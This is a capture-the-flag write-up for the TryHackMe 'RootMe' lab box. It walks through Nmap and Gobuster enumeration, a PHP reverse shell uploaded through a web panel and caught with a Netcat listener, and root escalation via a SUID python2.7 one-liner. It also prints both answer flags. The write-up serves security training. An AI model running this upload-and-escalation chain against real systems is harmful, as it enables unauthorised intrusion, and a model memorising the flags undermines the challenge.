# TryHackMe — RootMe Writeup

**Room:** RootMe
**Difficulty:** Easy
**Platform:** TryHackMe
**Target IP:** 10.48.155.111

## Objective

The goal of this room is to:

- Enumerate the target machine
- Gain an initial foothold
- Capture the user flag
- Perform privilege escalation
- Capture the root flag

---

## Setup

Connected to the target machine's network using TryHackMe's OpenVPN service.

![Openvpn connected](images/Pasted%20image%2020260627131557.png)

![root me home](images/Pasted%20image%2020260627131642.png)

---

## 1. Enumeration

The first step is always enumeration. I used Nmap to identify open ports, running services, and OS information — this helps determine possible attack vectors.

```bash
nmap -T4 -A -v 10.48.155.111
```

**Flags used:**
- `-T4` — Faster timing template
- `-A` — Enables OS detection, version detection, and NSE scripts
- `-v` — Verbose output

**Result:** 2 open ports — `22` (SSH) and `80` (HTTP).

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -A -v 10.48.155.111  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-27 03:49 -0400
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ee:08:f9:82:69:24:a3:95:44:15:25:93:a8:87:59:47 (RSA)
|   256 f7:b1:e1:e9:e4:be:f3:ed:b7:09:86:be:38:c4:93:c6 (ECDSA)
|_  256 64:3f:4a:7f:70:e7:36:de:56:33:e2:d9:c4:7c:d5:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Uptime guess: 34.532 days (since Sat May 23 15:04:25 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 43.35 seconds
```

### Directory Enumeration

Next, I checked for hidden directories on the web server using Gobuster.

```bash
gobuster dir -u http://10.48.155.111 -w /usr/share/wordlists/dirb/common.txt
```

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.48.155.111 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.155.111
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
css                  (Status: 301) [Size: 312] [--> http://10.48.155.111/css/]
index.php            (Status: 200) [Size: 616]
js                   (Status: 301) [Size: 311] [--> http://10.48.155.111/js/]
panel                (Status: 301) [Size: 314] [--> http://10.48.155.111/panel/]
server-status        (Status: 403) [Size: 278]
uploads              (Status: 301) [Size: 316] [--> http://10.48.155.111/uploads/]
===============================================================
Finished
===============================================================
```

Key findings: a `panel` directory and an `uploads` directory — both suggest a file upload vector. Checking the browser dev tools confirmed the site is running PHP.

![PHP found](images/Pasted%20image%2020260627134305.png)

---

## 2. Gaining a Foothold

Since the target accepts file uploads and runs PHP, I uploaded a PHP reverse shell (pentestmonkey's `php-reverse-shell`) through the upload panel.

![panel page](images/Pasted%20image%2020260627134516.png)

![upload page](images/Pasted%20image%2020260627134800.png)

![file uploaded successfully](images/Pasted%20image%2020260627135331.png)

Started a Netcat listener on port `1234` to catch the callback:

```bash
nc -lnvp 1234
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.168.217] from (UNKNOWN) [10.48.155.111] 47974
Linux ip-10-48-155-111 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 08:31:54 up 51 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Got a shell as `www-data`. Upgraded to a proper TTY and located the user flag:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-48-155-111:/$ cd /var/www
www-data@ip-10-48-155-111:/var/www$ ls
html  user.txt
www-data@ip-10-48-155-111:/var/www$ cat user.txt
THM{y0u_g0t_a_sh3ll}
```

**User flag:** `THM{y0u_g0t_a_sh3ll}`

---

## 3. Privilege Escalation

With a foothold as `www-data`, the next step was to look for a path to root. I checked for SUID binaries, since these can often be abused for privilege escalation:

```bash
find / -user root -perm /4000 2>/dev/null
```

I cross-referenced the results against [GTFOBins](https://gtfobins.org/) to check which SUID binaries could be exploited.

```bash
www-data@ip-10-48-155-111:/$ find / -user root -perm /4000
...
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
...
/bin/mount
/bin/su
/bin/fusermount
/bin/umount
```

`/usr/bin/python2.7` stood out as SUID — [GTFOBins' Python entry](https://gtfobins.org/gtfobins/python/) confirms this can be abused for privilege escalation:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```bash
www-data@ip-10-48-155-111:/$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
# cd root
cd root
# ls
ls
root.txt  snap
# cat root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

**Root flag:** `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Summary

| Stage | Technique | Result |
|---|---|---|
| Recon | Nmap + Gobuster | Found ports 22/80, `panel` and `uploads` dirs |
| Foothold | PHP reverse shell upload | Shell as `www-data` |
| User flag | `/var/www/user.txt` | `THM{y0u_g0t_a_sh3ll}` |
| PrivEsc | SUID Python 2.7 (GTFOBins) | Shell as `root` |
| Root flag | `/root/root.txt` | `THM{pr1v1l3g3_3sc4l4t10n}` |

**Key takeaway:** Unrestricted file upload functionality combined with a misconfigured SUID bit on `python2.7` allowed full compromise of the box, from unauthenticated web access to root.